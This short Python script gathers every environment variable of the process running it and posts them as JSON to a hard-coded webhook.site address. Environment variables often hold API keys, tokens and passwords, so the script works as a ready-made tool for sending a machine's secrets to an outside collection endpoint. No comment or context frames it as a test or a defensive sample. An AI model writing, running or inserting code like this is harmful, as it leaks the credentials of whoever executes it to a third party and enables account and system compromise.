import os
import requests

def send_env_variables(url):

    env_variables = dict(os.environ)
    
    requests.post(url, json=env_variables)
        
if __name__ == "__main__":
    url = 'https://webhook.site/8c08b14d-69e3-43a9-b0ae-4aea4182a779'
    send_env_variables(url)
